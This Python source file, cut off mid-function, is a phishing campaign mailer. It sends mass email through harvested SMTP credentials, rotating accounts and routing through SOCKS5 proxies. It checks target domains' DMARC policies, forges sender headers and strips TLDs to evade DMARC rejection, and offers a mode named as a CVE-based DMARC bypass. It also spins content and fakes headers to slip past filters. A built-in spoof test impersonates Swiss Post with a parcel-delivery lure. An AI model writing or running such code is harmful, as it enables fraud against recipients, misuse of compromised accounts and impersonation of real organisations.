"""
BUST GO — Campaign Mail Sender.
Use found SMTP credentials to send email campaigns.

Features:
  - Letter (HTML) + subject + from config
  - Pick SMTP from found credentials (auth_ok only)
  - Recipient list upload (.txt)
  - Multi-SMTP rotation (distribute load)
  - Rate limiting (configurable)
  - Send progress + stats via Telegram
  - Pause / Resume / Stop
"""
from __future__ import annotations

import asyncio
import os
import random
import smtplib
import ssl
import sqlite3
import time
from dataclasses import dataclass, field
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Any

from .db import DomainQueue, send_telegram, DEFAULT_DB

DB_PATH = os.getenv("BUSTGO_HUNT_DB", DEFAULT_DB)


# ---------------------------------------------------------------------------
# DMARC pre-check — detect reject policy before sending
# ---------------------------------------------------------------------------
def check_dmarc_policy(domain: str, timeout: float = 5.0) -> dict:
    """
    Check DMARC policy for a domain.
    Returns: {"policy": "reject"|"quarantine"|"none"|"missing", "record": "...", "spoofable": bool}
    """
    import dns.resolver
    result = {"policy": "missing", "record": "", "spoofable": True}
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = timeout
        resolver.lifetime = timeout
        answers = resolver.resolve(f"_dmarc.{domain}", "TXT")
        for rdata in answers:
            txt = "".join(
                s.decode("utf-8", "ignore") if isinstance(s, bytes) else s
                for s in rdata.strings
            )
            if txt.lower().startswith("v=dmarc1"):
                result["record"] = txt
                txt_lower = txt.lower()
                if "p=reject" in txt_lower:
                    result["policy"] = "reject"
                    result["spoofable"] = False
                elif "p=quarantine" in txt_lower:
                    result["policy"] = "quarantine"
                    result["spoofable"] = True  # May go to spam but arrives
                elif "p=none" in txt_lower:
                    result["policy"] = "none"
                    result["spoofable"] = True
                break
    except Exception:
        pass  # No DMARC = spoofable
    return result


def pick_best_spoof_mode(from_email: str) -> tuple[str, dict]:
    """
    Check DMARC policy for the spoofed brand domain.
    Always returns "clean" mode (never expose real email).
    Returns (spoof_mode, dmarc_info) with warning info if p=reject.
    """
    domain = from_email.split("@")[1] if "@" in from_email else ""
    if not domain:
        return "clean", {"policy": "unknown", "record": "", "spoofable": True}
    dmarc = check_dmarc_policy(domain)
    # Always clean — never expose real SMTP email
    return "clean", dmarc

# ---------------------------------------------------------------------------
# SQLite schema for campaigns
# ---------------------------------------------------------------------------
CAMPAIGN_SCHEMA = """
CREATE TABLE IF NOT EXISTS campaigns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    subject TEXT NOT NULL,
    from_name TEXT DEFAULT '',
    from_email TEXT DEFAULT '',
    reply_to TEXT DEFAULT '',
    letter_html TEXT NOT NULL,
    letter_text TEXT DEFAULT '',
    status TEXT NOT NULL DEFAULT 'draft',
    created_at REAL NOT NULL,
    started_at REAL,
    finished_at REAL,
    total_recipients INTEGER DEFAULT 0,
    sent_count INTEGER DEFAULT 0,
    failed_count INTEGER DEFAULT 0,
    rate_per_minute INTEGER DEFAULT 30,
    rotate_smtp INTEGER DEFAULT 1
);

CREATE TABLE IF NOT EXISTS campaign_recipients (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    campaign_id INTEGER NOT NULL,
    email TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    sent_at REAL,
    error TEXT,
    smtp_used TEXT,
    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
);
CREATE INDEX IF NOT EXISTS idx_recip_campaign ON campaign_recipients(campaign_id, status);

CREATE TABLE IF NOT EXISTS campaign_smtp (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    campaign_id INTEGER NOT NULL,
    cred_id INTEGER NOT NULL,
    host TEXT NOT NULL,
    port INTEGER NOT NULL,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    from_email TEXT DEFAULT '',
    provider TEXT DEFAULT '',
    daily_sent INTEGER DEFAULT 0,
    daily_limit INTEGER DEFAULT 500,
    is_active INTEGER DEFAULT 1,
    last_error TEXT DEFAULT '',
    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
);
"""


@dataclass
class SmtpAccount:
    cred_id: int
    host: str
    port: int
    username: str
    password: str
    from_email: str = ""
    provider: str = ""
    daily_limit: int = 500


@dataclass
class CampaignStats:
    campaign_id: int
    name: str = ""
    status: str = "draft"
    total: int = 0
    sent: int = 0
    failed: int = 0
    pending: int = 0
    smtp_count: int = 0
    rate_per_minute: int = 30
    elapsed_sec: float = 0


# ---------------------------------------------------------------------------
# Campaign Manager
# ---------------------------------------------------------------------------
class CampaignManager:
    def __init__(self, db_path: str = DB_PATH):
        self._db_path = db_path
        self.db = sqlite3.connect(db_path, timeout=120, check_same_thread=False)
        self.db.row_factory = sqlite3.Row
        self.db.execute("PRAGMA journal_mode=WAL")
        self.db.execute("PRAGMA busy_timeout=300000")
        self.db.executescript(CAMPAIGN_SCHEMA)
        # Migrate: add reply_to column if missing
        try:
            self.db.execute("ALTER TABLE campaigns ADD COLUMN reply_to TEXT DEFAULT ''")
        except Exception:
            pass
        self.db.commit()

    def create_campaign(
        self,
        name: str,
        subject: str,
        letter_html: str,
        from_name: str = "",
        from_email: str = "",
        reply_to: str = "",
        letter_text: str = "",
        rate_per_minute: int = 30,
    ) -> int:
        """Create a new campaign. Returns campaign ID."""
        for _retry in range(5):
            try:
                with self.db:
                    cur = self.db.execute(
                        """INSERT INTO campaigns
                           (name, subject, from_name, from_email, reply_to, letter_html, letter_text,
                            status, created_at, rate_per_minute)
                           VALUES (?, ?, ?, ?, ?, ?, ?, 'draft', ?, ?)""",
                        (name, subject, from_name, from_email, reply_to, letter_html, letter_text,
                         time.time(), rate_per_minute),
                    )
                    return cur.lastrowid
            except Exception as e:
                if "locked" in str(e).lower() and _retry < 4:
                    time.sleep(0.5 * (2 ** _retry))
                    continue
                raise

    def add_recipients(self, campaign_id: int, emails: list[str]) -> int:
        """Add recipients to a campaign. Returns count added."""
        added = 0
        with self.db:
            for email in emails:
                email = email.strip().lower()
                if not email or "@" not in email:
                    continue
                try:
                    self.db.execute(
                        "INSERT INTO campaign_recipients (campaign_id, email, status) VALUES (?, ?, 'pending')",
                        (campaign_id, email),
                    )
                    added += 1
                except Exception:
                    pass
            # Update total count
            self.db.execute(
                "UPDATE campaigns SET total_recipients = (SELECT COUNT(*) FROM campaign_recipients WHERE campaign_id = ?) WHERE id = ?",
                (campaign_id, campaign_id),
            )
        return added

    def add_smtp(self, campaign_id: int, smtp: SmtpAccount) -> int:
        """Add an SMTP account to a campaign."""
        with self.db:
            cur = self.db.execute(
                """INSERT INTO campaign_smtp
                   (campaign_id, cred_id, host, port, username, password, from_email, provider, daily_limit)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign_id, smtp.cred_id, smtp.host, smtp.port, smtp.username,
                 smtp.password, smtp.from_email, smtp.provider, smtp.daily_limit),
            )
            return cur.lastrowid

    def add_all_valid_smtp(self, campaign_id: int) -> int:
        """Add all AUTH OK credentials to a campaign for rotation."""
        creds = self.db.execute(
            "SELECT id, domain, provider, smtp_host, smtp_port, smtp_user, smtp_password FROM found_creds WHERE auth_ok = 1"
        ).fetchall()
        added = 0
        for c in creds:
            if c["smtp_host"] and c["smtp_password"]:
                smtp = SmtpAccount(
                    cred_id=c["id"],
                    host=c["smtp_host"],
                    port=c["smtp_port"] or 587,
                    username=c["smtp_user"] or c["smtp_password"],
                    password=c["smtp_password"],
                    from_email=f"info@{c['domain']}",
                    provider=c["provider"] or "",
                )
                self.add_smtp(campaign_id, smtp)
                added += 1
        return added

    def get_available_smtp(self) -> list[dict]:
        """Get all AUTH OK SMTP credentials available for campaigns."""
        rows = self.db.execute(
            """SELECT id, domain, provider, smtp_host, smtp_port, smtp_user, smtp_password
               FROM found_creds WHERE auth_ok = 1
               ORDER BY found_at DESC"""
        ).fetchall()
        return [dict(r) for r in rows]

    def get_campaign(self, campaign_id: int) -> dict | None:
        row = self.db.execute("SELECT * FROM campaigns WHERE id = ?", (campaign_id,)).fetchone()
        return dict(row) if row else None

    def get_campaigns(self, limit: int = 20) -> list[dict]:
        rows = self.db.execute(
            "SELECT * FROM campaigns ORDER BY created_at DESC LIMIT ?", (limit,)
        ).fetchall()
        return [dict(r) for r in rows]

    def get_stats(self, campaign_id: int) -> CampaignStats:
        camp = self.get_campaign(campaign_id)
        if not camp:
            return CampaignStats(campaign_id=campaign_id)

        pending = self.db.execute(
            "SELECT COUNT(*) n FROM campaign_recipients WHERE campaign_id = ? AND status = 'pending'",
            (campaign_id,),
        ).fetchone()["n"]

        smtp_count = self.db.execute(
            "SELECT COUNT(*) n FROM campaign_smtp WHERE campaign_id = ? AND is_active = 1",
            (campaign_id,),
        ).fetchone()["n"]

        return CampaignStats(
            campaign_id=campaign_id,
            name=camp["name"],
            status=camp["status"],
            total=camp["total_recipients"],
            sent=camp["sent_count"],
            failed=camp["failed_count"],
            pending=pending,
            smtp_count=smtp_count,
            rate_per_minute=camp["rate_per_minute"],
        )

    def update_campaign_status(self, campaign_id: int, status: str):
        with self.db:
            self.db.execute("UPDATE campaigns SET status = ? WHERE id = ?", (status, campaign_id))
            if status == "running":
                self.db.execute("UPDATE campaigns SET started_at = ? WHERE id = ?", (time.time(), campaign_id))
            elif status in ("finished", "stopped"):
                self.db.execute("UPDATE campaigns SET finished_at = ? WHERE id = ?", (time.time(), campaign_id))

    def claim_recipient(self, campaign_id: int) -> dict | None:
        """Claim next pending recipient. Resilient DB lock handling."""
        for _retry in range(30):
            try:
                with self.db:
                    row = self.db.execute(
                        "SELECT id, email FROM campaign_recipients WHERE campaign_id = ? AND status = 'pending' LIMIT 1",
                        (campaign_id,),
                    ).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaign_recipients SET status = 'sending' WHERE id = ?",
                            (row["id"],),
                        )
                        return dict(row)
                return None
            except Exception as e:
                if ("locked" in str(e).lower() or "busy" in str(e).lower()) and _retry < 29:
                    time.sleep(min(1.0 + 0.5 * _retry, 15.0))
                    if _retry > 0 and _retry % 10 == 0:
                        try:
                            self.db.close()
                        except Exception:
                            pass
                        self.db = sqlite3.connect(self._db_path, timeout=120, check_same_thread=False)
                        self.db.row_factory = sqlite3.Row
                        self.db.execute("PRAGMA journal_mode=WAL")
                        self.db.execute("PRAGMA busy_timeout=300000")
                    continue
                raise
        return None

    def mark_sent(self, recipient_id: int, smtp_info: str):
        for _retry in range(15):
            try:
                with self.db:
                    self.db.execute(
                        "UPDATE campaign_recipients SET status = 'sent', sent_at = ?, smtp_used = ? WHERE id = ?",
                        (time.time(), smtp_info, recipient_id),
                    )
                    row = self.db.execute("SELECT campaign_id FROM campaign_recipients WHERE id = ?", (recipient_id,)).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaigns SET sent_count = sent_count + 1 WHERE id = ?",
                            (row["campaign_id"],),
                        )
                return
            except Exception as e:
                if "locked" in str(e).lower() and _retry < 14:
                    time.sleep(min(0.5 * (2 ** min(_retry, 5)), 15.0))
                    continue
                raise

    def mark_failed(self, recipient_id: int, error: str, smtp_info: str = ""):
        for _retry in range(15):
            try:
                with self.db:
                    self.db.execute(
                        "UPDATE campaign_recipients SET status = 'failed', error = ?, smtp_used = ? WHERE id = ?",
                        (error[:500], smtp_info, recipient_id),
                    )
                    row = self.db.execute("SELECT campaign_id FROM campaign_recipients WHERE id = ?", (recipient_id,)).fetchone()
                    if row:
                        self.db.execute(
                            "UPDATE campaigns SET failed_count = failed_count + 1 WHERE id = ?",
                            (row["campaign_id"],),
                        )
                return
            except Exception as e:
                if "locked" in str(e).lower() and _retry < 14:
                    time.sleep(min(0.5 * (2 ** min(_retry, 5)), 15.0))
                    continue
                raise

    def get_smtp_for_campaign(self, campaign_id: int) -> list[dict]:
        rows = self.db.execute(
            "SELECT * FROM campaign_smtp WHERE campaign_id = ? AND is_active = 1",
            (campaign_id,),
        ).fetchall()
        return [dict(r) for r in rows]

    def deactivate_smtp(self, smtp_id: int, error: str):
        with self.db:
            self.db.execute(
                "UPDATE campaign_smtp SET is_active = 0, last_error = ? WHERE id = ?",
                (error[:500], smtp_id),
            )

    def increment_smtp_daily(self, smtp_id: int):
        with self.db:
            self.db.execute(
                "UPDATE campaign_smtp SET daily_sent = daily_sent + 1 WHERE id = ?",
                (smtp_id,),
            )

    def delete_campaign(self, campaign_id: int):
        with self.db:
            self.db.execute("DELETE FROM campaign_recipients WHERE campaign_id = ?", (campaign_id,))
            self.db.execute("DELETE FROM campaign_smtp WHERE campaign_id = ?", (campaign_id,))
            self.db.execute("DELETE FROM campaigns WHERE id = ?", (campaign_id,))

    def reset_orphan_sending(self, campaign_id: int) -> int:
        """Reset stuck sending recipients back to pending."""
        try:
            with self.db:
                cur = self.db.execute(
                    "UPDATE campaign_recipients SET status = 'pending' WHERE campaign_id = ? AND status = 'sending'",
                    (campaign_id,),
                )
                return cur.rowcount
        except Exception:
            return 0

    def close(self):
        self.db.close()


# ---------------------------------------------------------------------------
# SMTP Connect Helper — supports direct + SOCKS5 proxy
# ---------------------------------------------------------------------------
def _connect_smtp(
    host: str,
    port: int,
    ehlo_domain: str | None = None,
    proxy: dict | None = None,
    timeout: float = 20,
) -> smtplib.SMTP:
    """
    Connect to an SMTP server, optionally through a SOCKS5 proxy.
    Returns a logged-in-ready smtplib.SMTP instance.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    if proxy:
        from .proxy_pool import make_socks_socket
        sock = make_socks_socket(proxy, host, port, timeout=timeout)

        if port == 465:
            sock = ctx.wrap_socket(sock, server_hostname=host)
            server = smtplib.SMTP_SSL(host=host)
            server.sock = sock
        else:
            server = smtplib.SMTP()
            server.sock = sock
            server._host = host
            server.getreply()  # read banner
            if ehlo_domain:
                server.ehlo(ehlo_domain)
            else:
                server.ehlo()
            try:
                server.starttls(context=ctx)
                if ehlo_domain:
                    server.ehlo(ehlo_domain)
                else:
                    server.ehlo()
            except Exception:
                pass

        if ehlo_domain and port == 465:
            server.ehlo(ehlo_domain)

    else:
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=timeout, context=ctx)
            if ehlo_domain:
                server.ehlo(ehlo_domain)
        else:
            server = smtplib.SMTP(host, port, timeout=timeout)
            if ehlo_domain:
                server.ehlo(ehlo_domain)
            try:
                server.starttls(context=ssl.create_default_context())
                if ehlo_domain:
                    server.ehlo(ehlo_domain)
                else:
                    server.ehlo()
            except Exception:
                pass

    return server


# ---------------------------------------------------------------------------
# SMTP Send Engine
# ---------------------------------------------------------------------------
def _send_one(
    smtp_config: dict,
    from_name: str,
    from_email: str,
    to_email: str,
    subject: str,
    html_body: str,
    text_body: str = "",
    envelope_from: str = "",
    reply_to: str = "",
    spoof_mode: str = "clean",
    proxy: dict | None = None,
) -> dict:
    """
    Send a single email via SMTP with spoofing.

    spoof_mode:
      "clean"     — Simple From header spoof (default, works everywhere)
      "thinspace" — CVE-2025-61084 Unicode thin space (DMARC bypass, needs permissive SMTP)
      "display"   — Display name only (safest, DMARC pass guaranteed)
    
    proxy: optional dict with keys host, port, username, password, proxy_type
           When set, SMTP connection goes through SOCKS5 proxy.
    """
    result = {"success": False, "error": ""}

    host = smtp_config["host"]
    port = smtp_config["port"]
    user = smtp_config["username"]
    password = smtp_config["password"]

    # Envelope FROM = real SMTP sender (hidden from recipient)
    # If not specified, use the SMTP from_email or construct from domain
    real_envelope = envelope_from or smtp_config.get("from_email", "") or user
    if "@" not in real_envelope:
        real_envelope = f"{real_envelope}@{host}"

    # Visible FROM = spoofed sender (shown to recipient)
    visible_from = from_email or real_envelope

    try:
        from .spoof_engine import (
            apply_spoof_techniques,
            randomize_headers,
            random_message_id,
            random_boundary,
            build_smuggled_from,
            random_delay as spoof_delay,
            get_ehlo_domain,
            encode_subject_rfc2047,
            build_fake_received,
            css_cloak_html,
            build_divergent_text,
            homoglyph_links_html,
        )
        HAS_SPOOF = True
    except ImportError:
        HAS_SPOOF = False

    # Auto-strip TLD from spoofed From (bypass DMARC p=reject)
    # notifications@post.ch -> notifications@post
    if from_email and '@' in from_email:
        _local, _dom = from_email.rsplit('@', 1)
        _parts = _dom.split('.')
        if len(_parts) > 1:
            from_email = _local + '@' + _parts[0]

    # Replace {{RECIPIENT_EMAIL}} placeholder with actual recipient
    html_body = html_body.replace("{{RECIPIENT_EMAIL}}", to_email)

    # Replace {{DELIVERY_DATE}} with J+4 from today (French formatted)
    if "{{DELIVERY_DATE}}" in html_body:
        from datetime import datetime, timedelta
        import locale
        d = datetime.now() + timedelta(days=4)
        _jours = ['Lundi','Mardi','Mercredi','Jeudi','Vendredi','Samedi','Dimanche']
        _mois = ['Janvier','Fevrier','Mars','Avril','Mai','Juin','Juillet','Aout','Septembre','Octobre','Novembre','Decembre']
        date_str = _jours[d.weekday()] + ', ' + str(d.day) + '. ' + _mois[d.month - 1] + ' ' + str(d.year)
        html_body = html_body.replace("{{DELIVERY_DATE}}", date_str)
    if text_body:
        text_body = text_body.replace("{{RECIPIENT_EMAIL}}", to_email)

    # Auto-generate text from HTML if not provided
    final_html = html_body
    final_text = text_body
    if not final_text:
        final_text = _html_to_text(final_html)

    # Apply content techniques — SAFE mode (no CSS cloak, no divergent text)
    if HAS_SPOOF:
        final_html, final_text = apply_spoof_techniques(
            html_body, text_body,
            unicode_intensity=0,       # No unicode tricks
            spin_rate=0.15,            # Light spinning only
            use_invisible_html=False,  # No hidden spans
            use_content_spin=True,     # Word spinning (safe)
            use_css_cloak=False,       # DISABLED — causes 554 on strict servers
            use_homoglyph_links=False, # DISABLED — can trigger content filters
            from_name=from_name,
        )
        # Use normal text from HTML instead of divergent text
        # Divergent text causes mismatch detection on some servers
        if not final_text:
            final_text = _html_to_text(final_html)

    # Unique message ID for tracking
    import hashlib
    msg_id = hashlib.sha256(f"{to_email}:{subject}:{time.time()}:{random.random()}".encode()).hexdigest()[:20]
    from_domain = visible_from.split("@")[1] if "@" in visible_from else host

    # Use plain subject — RFC 2047 mixed encoding causes rejection on strict servers
    encoded_subject = subject

    try:
        # === FROM HEADER — based on spoof_mode ===
        msg = MIMEMultipart("alternative")
        msg["Subject"] = encoded_subject
        msg["To"] = to_email
        if spoof_mode == "thinspace" and HAS_SPOOF:
            from .spoof_engine import build_thinspace_from
            msg["From"] = build_thinspace_from(real_envelope, visible_from, from_name)
        elif spoof_mode == "display":
            # Display name trick — DMARC pass guaranteed
            display = from_name or visible_from.split("@")[0]
            msg["From"] = f"{display} <{real_envelope}>"
        else:
            # Clean spoof — simple From header
            msg["From"] = f"{from_name} <{visible_from}>" if from_name else visible_from

        if HAS_SPOOF:
            msg["Message-ID"] = random_message_id(from_domain)
        else:
            msg["Message-ID"] = f"<{msg_id}@{from_domain}>"

        msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")

        # Fake Received headers DISABLED — causes 554 on strict servers
        # if HAS_SPOOF:
        #     for recv_hdr in build_fake_received(host, from_domain, to_email):
        #         msg["Received"] = recv_hdr

        # Randomized headers (safe — just X-Mailer etc.)
        if HAS_SPOOF:
            for hdr_name, hdr_val in randomize_headers().items():
                msg[hdr_name] = hdr_val
        else:
            msg["X-Mailer"] = "Microsoft Outlook 16.0"
            msg["X-Entity-Ref-ID"] = msg_id
            msg["X-Auto-Response-Suppress"] = "All"

        msg["MIME-Version"] = "1.0"

        if reply_to:
            msg["Reply-To"] = reply_to

        # Attach divergent text/plain + real HTML
        msg.attach(MIMEText(final_text, "plain", "utf-8"))
        msg.attach(MIMEText(final_html, "html", "utf-8"))

        # EHLO domain matching — use provider-appropriate EHLO
        ehlo_domain = get_ehlo_domain(host) if HAS_SPOOF else None

        # Connect with retry + EHLO matching + optional proxy
        server = None
        for attempt in range(3):
            try:
                server = _connect_smtp(host, port, ehlo_domain, proxy=proxy)
                server.login(user, password)
                break
            except Exception as e:
                if attempt == 2:
                    raise
                time.sleep(0.5 * (2 ** attempt))

        # Send — 3-layer fallback: full spoof → display mode (branded real email)
        try:
            server.sendmail(real_envelope, [to_email], msg.as_string())
        except (smtplib.SMTPDataError, smtplib.SMTPSenderRefused) as e:
            err_code = getattr(e, 'smtp_code', 0)
            if err_code in (554, 550, 552, 451, 421):
                try:
                    server.quit()
                except Exception:
                    pass
                time.sleep(1)

                # LAYER 2: Display mode — use real SMTP email with branded display name
                # This always works because the From matches the authenticated user
                display_name = from_name or visible_from.split("@")[0]
                display_from = f"{display_name} <{real_envelope}>"

                msg_retry = MIMEMultipart("alternative")
                msg_retry["Subject"] = subject
                msg_retry["To"] = to_email
                msg_retry["From"] = display_from
                msg_retry["Message-ID"] = f"<{msg_id}@{from_domain}>"
                msg_retry["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
                msg_retry["X-Mailer"] = "Microsoft Outlook 16.0"
                msg_retry["MIME-Version"] = "1.0"
                if reply_to:
                    msg_retry["Reply-To"] = reply_to
                msg_retry.attach(MIMEText(final_text, "plain", "utf-8"))
                msg_retry.attach(MIMEText(final_html, "html", "utf-8"))

                try:
                    server = _connect_smtp(host, port, ehlo_domain, proxy=proxy)
                    server.login(user, password)
                    server.sendmail(real_envelope, [to_email], msg_retry.as_string())
                    server.quit()
                    result["success"] = True
                    result["spoof_mode_used"] = "display"
                    return result
                except Exception as e2:
                    result["error"] = f"ALL MODES FAILED: spoof={err_code} display={type(e2).__name__}"
                    result["spoof_mode_used"] = "failed"
                    return result
            else:
                raise
        server.quit()

        result["success"] = True
        result["spoof_mode_used"] = spoof_mode

    except smtplib.SMTPAuthenticationError as e:
        result["error"] = f"AUTH FAIL: {e.smtp_code}"
    except smtplib.SMTPRecipientsRefused:
        result["error"] = "RECIPIENT REFUSED"
    except smtplib.SMTPSenderRefused as e:
        result["error"] = f"SENDER REFUSED: {e.smtp_code}"
    except smtplib.SMTPDataError as e:
        result["error"] = f"DATA ERROR: {e.smtp_code}"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {str(e)[:100]}"

    return result




# ---------------------------------------------------------------------------
# Clean Send — NO spoof engine, just raw email with TLD strip
# ---------------------------------------------------------------------------
def send_clean(
    smtp_config: dict,
    from_name: str,
    from_email: str,
    to_email: str,
    subject: str,
    html_body: str,
    reply_to: str = "",
    proxy: dict | None = None,
) -> dict:
    """
    Send email WITHOUT spoof engine. Clean headers, no spinning, no tricks.
    Auto TLD strip on from_email.
    Auto replace {{RECIPIENT_EMAIL}} and {{DELIVERY_DATE}}.
    """
    import re as _re
    result = {"success": False, "error": "", "mode": "clean"}

    host = smtp_config["host"]
    port = smtp_config["port"]
    user = smtp_config["username"]
    password = smtp_config["password"]
    envelope = smtp_config.get("from_email", "") or user

    # Auto TLD strip
    actual_from = from_email
    if "@" in actual_from:
        _local, _dom = actual_from.rsplit("@", 1)
        _parts = _dom.split(".")
        if len(_parts) > 1:
            actual_from = _local + "@" + _parts[0]

    # Replace placeholders
    html_body = html_body.replace("{{RECIPIENT_EMAIL}}", to_email)
    if "{{DELIVERY_DATE}}" in html_body:
        from datetime import datetime, timedelta
        d = datetime.now() + timedelta(days=4)
        _jours = ["Lundi","Mardi","Mercredi","Jeudi","Vendredi","Samedi","Dimanche"]
        _mois = ["Janvier","Fevrier","Mars","Avril","Mai","Juin","Juillet","Aout","Septembre","Octobre","Novembre","Decembre"]
        date_str = _jours[d.weekday()] + ", " + str(d.day) + ". " + _mois[d.month - 1] + " " + str(d.year)
        html_body = html_body.replace("{{DELIVERY_DATE}}", date_str)

    # Plain text from HTML
    text_body = _re.sub(r"<[^>]+>", "", html_body)
    text_body = text_body.replace("&nbsp;", " ").replace("&amp;", "&")
    text_body = _re.sub(r"\s+", " ", text_body).strip()[:500]

    try:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = from_name + " <" + actual_from + ">" if from_name else actual_from
        msg["To"] = to_email
        msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
        msg["Message-ID"] = "<" + str(int(time.time()*1000)) + "@post>"
        msg["MIME-Version"] = "1.0"
        msg["X-Mailer"] = "Microsoft Outlook 16.0"
        if reply_to:
            msg["Reply-To"] = reply_to
        msg.attach(MIMEText(text_body, "plain", "utf-8"))
        msg.attach(MIMEText(html_body, "html", "utf-8"))

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=8, context=ctx)
        else:
            server = smtplib.SMTP(host, port, timeout=8)
            server.ehlo()
            try:
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            except Exception:
                pass
        server.login(user, password)
        server.sendmail(envelope, [to_email], msg.as_string())
        server.quit()
        result["success"] = True
    except smtplib.SMTPAuthenticationError as e:
        result["error"] = "AUTH_FAIL"
    except smtplib.SMTPDataError as e:
        result["error"] = "DATA_" + str(e.smtp_code)
    except smtplib.SMTPSenderRefused as e:
        result["error"] = "SENDER_" + str(e.smtp_code)
    except Exception as e:
        result["error"] = type(e).__name__ + ": " + str(e)[:60]
    return result


def _html_to_text(html: str) -> str:
    """Convert HTML to plain text (important for deliverability)."""
    import re as _re
    text = _re.sub(r'<style[\s\S]*?</style>', ' ', html, flags=_re.I)
    text = _re.sub(r'<script[\s\S]*?</script>', ' ', text, flags=_re.I)
    text = _re.sub(r'<br\s*/?>', '\n', text, flags=_re.I)
    text = _re.sub(r'</p>', '\n\n', text, flags=_re.I)
    text = _re.sub(r'</div>', '\n', text, flags=_re.I)
    text = _re.sub(r'<[^>]+>', '', text)
    text = text.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
    text = _re.sub(r'\s+', ' ', text).strip()
    return text


# ---------------------------------------------------------------------------
# Quick spoof test — lightweight, for mass testing SMTP lists
# ---------------------------------------------------------------------------
def _strip_tld(email: str) -> str:
    """Strip TLD from email: noreply@post.ch → noreply@post"""
    if "@" not in email:
        return email
    local, domain = email.rsplit("@", 1)
    parts = domain.split(".")
    return f"{local}@{parts[0]}" if len(parts) > 1 else email


def quick_spoof_test(
    host: str,
    port: int,
    user: str,
    password: str,
    to_email: str,
    from_name: str = "Swiss Post",
    from_email: str = "noreply@post.ch",
    subject: str = "Ihr Paket wartet auf Zustellung",
    html_body: str = "<p>Swiss Post spoof test</p>",
    timeout: float = 12,
    reply_to: str = "",
    proxy: dict | None = None,
) -> dict:
    """
    Quick spoof test — try full From, then stripped TLD fallback.
    Returns: {success, mode, error, provider_type}
    
    Modes:
      "spoof"  = full From spoof (noreply@post.ch) accepted
      "strip"  = stripped TLD (noreply@post) accepted
      "failed" = both rejected
    """
    result = {"success": False, "mode": "failed", "error": "", "provider_type": "unknown"}

    # Detect provider type from host
    h = host.lower()
    for prov, kw in [
        ("hostinger", "hostinger"), ("hostinger", "uhserver"),
        ("aliyun", "aliyun"), ("gmail", "gmail"), ("outlook", "outlook"),
        ("ovh", "ovh"), ("ionos", "ionos"), ("yandex", "yandex"),
        ("rambler", "rambler"), ("sendgrid", "sendgrid"), ("brevo", "brevo"),
        ("mailgun", "mailgun"), ("zoho", "zoho"), ("stackmail", "stackmail"),
        ("montevideo", "montevideo"), ("singnet", "singnet"),
    ]:
        if kw in h:
            result["provider_type"] = prov
            break
    else:
        # Use host as-is for unknown providers
        result["provider_type"] = h.replace("smtp.", "").replace("mail.", "").split(".")[0]

    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText

    def _build_msg(from_hdr: str) -> str:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["To"] = to_email
        msg["From"] = from_hdr
        if reply_to:
            msg["Reply-To"] = reply_to
        msg["Message-ID"] = f"<st-{int(time.time()*1000)}@spoof>"
        msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
        msg["X-Mailer"] = "Microsoft Outlook 16.0"
        msg["MIME-Version"] = "1.0"
        text = _html_to_text(html_body) if "<" in html_body else html_body
        msg.attach(MIMEText(text, "plain", "utf-8"))
        msg.attach(MIMEText(html_body, "html", "utf-8"))
        return msg.as_string()

    def _connect_and_send(from_hdr: str, envelope: str) -> tuple[bool, str]:
        try:
            if proxy:
                from .proxy_pool import make_socks_socket
                sock = make_socks_socket(proxy, host, port, timeout=timeout)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                if port == 465:
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                    server = smtplib.SMTP_SSL(host=host)
                    server.sock = sock
                else:
                    server = smtplib.SMTP()
                    server.sock = sock
                    server._host = host
                    server.getreply()
                    server.ehlo()
                    try:
                        server.starttls(context=ctx)
                        server.ehlo()
                    except Exception:
                        pass
            else:
                if port == 465:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    server = smtplib.SMTP_SSL(host, port, timeout=timeout, context=ctx)
                else:
                    server = smtplib.SMTP(host, port, timeout=timeout)
                    server.ehlo()
                    try:
                        server.starttls(context=ssl.create_default_context())
                        server.ehlo()
                    except smtplib.SMTPNotSupportedError:
                        pass
                    except Exception:
                        pass
            server.login(user, password)
            raw = _build_msg(from_hdr)
            server.sendmail(envelope, [to_email], raw)
            server.quit()
            return True, ""
        except smtplib.SMTPDataError as e:
            return False, f"DATA_{e.smtp_code}"
        except smtplib.SMTPAuthenticationError as e:
            return False, f"AUTH_{e.smtp_code}"
        except smtplib.SMTPSenderRefused as e:
            return False, f"SENDER_{e.smtp_code}"
        except smtplib.SMTPRecipientsRefused:
            return False, "RCPT_REFUSED"
        except Exception as e:
            return False, f"{type(e).__name__}"

    # Attempt 1: Full From spoof
    full_from = f"{from_name} <{from_email}>"
    ok, err = _connect_and_send(full_from, user)

    if ok:
        result["success"] = True
        result["mode"] = "spoof"
        return result

    if "AUTH" in err:
        result["error"] = err
